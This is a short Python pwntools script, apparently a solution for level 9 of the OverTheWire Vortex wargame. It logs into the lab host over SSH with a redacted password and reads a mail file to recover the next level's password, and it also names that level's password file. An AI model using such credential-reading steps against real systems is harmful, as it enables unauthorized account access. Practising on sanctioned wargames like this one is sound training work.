#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn   import *

level    = 9
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = '<removed>'
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

log.success("password: %s" % shell.cat('/var/mail/vortex9'))